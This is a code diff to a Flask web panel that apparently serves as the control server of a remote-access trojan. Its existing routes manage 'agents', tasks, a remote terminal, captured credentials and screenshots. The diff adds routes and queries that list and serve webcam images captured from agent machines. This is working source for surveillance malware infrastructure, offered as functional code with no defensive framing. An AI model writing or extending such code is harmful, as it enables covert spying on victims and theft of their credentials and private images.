@@ -180,13 +180,18 @@ def init_view_routes(app):
         c.execute("SELECT id, timestamp FROM screenshots WHERE agent_id=? ORDER BY timestamp DESC LIMIT 5", (agent_id,))
         screenshots = [dict(zip(['id', 'timestamp'], row)) for row in c.fetchall()]
         
+        # Get recent webcam captures for this agent
+        c.execute("SELECT id, timestamp FROM webcam_captures WHERE agent_id=? ORDER BY timestamp DESC LIMIT 5", (agent_id,))
+        webcam_captures = [dict(zip(['id', 'timestamp'], row)) for row in c.fetchall()]
+        
         conn.close()
         
         return render_template('agent_detail.html', 
                              agent=agent, 
                              tasks=tasks, 
                              creds=creds,
-                             screenshots=screenshots)
+                             screenshots=screenshots,
+                             webcam_captures=webcam_captures)
 
     @app.route('/terminal/<agent_id>')
     @login_required
@@ -280,6 +285,47 @@ def init_view_routes(app):
         
         conn.close()
         return render_template('screenshots.html', screenshots=screenshots)
+
+    @app.route('/webcam_capture/<int:capture_id>')
+    @login_required
+    def get_webcam_capture(capture_id):
+        conn = sqlite3.connect(CONFIG.database)
+        c = conn.cursor()
+        c.execute("SELECT image FROM webcam_captures WHERE id=?", (capture_id,))
+        result = c.fetchone()
+        conn.close()
+        
+        if not result or not result[0]:
+            flash("Webcam capture not found or empty", "danger")
+            return redirect(url_for('webcam_captures'))
+        
+        return send_file(
+            io.BytesIO(result[0]),
+            mimetype='image/jpeg',
+            download_name=f"webcam_{capture_id}.jpg"
+        )
+
+    @app.route('/webcam_captures')
+    @login_required
+    def webcam_captures():
+        agent_id = request.args.get('agent_id')
+        conn = sqlite3.connect(CONFIG.database)
+        c = conn.cursor()
+
+        if agent_id:
+            c.execute('''SELECT wc.id, wc.timestamp, a.hostname, a.id as agent_id
+                         FROM webcam_captures wc LEFT JOIN agents a ON wc.agent_id = a.id
+                         WHERE wc.agent_id=? ORDER BY wc.timestamp DESC LIMIT 50''', (agent_id,))
+        else:
+            c.execute('''SELECT wc.id, wc.timestamp, a.hostname, a.id as agent_id
+                         FROM webcam_captures wc LEFT JOIN agents a ON wc.agent_id = a.id
+                         ORDER BY wc.timestamp DESC LIMIT 50''')
+
+        captures = [dict(zip(['id', 'timestamp', 'hostname', 'agent_id'], row))
+                      for row in c.fetchall()]
+
+        conn.close()
+        return render_template('webcam_captures.html', captures=captures)
 
     @app.route('/credentials')
     @login_required
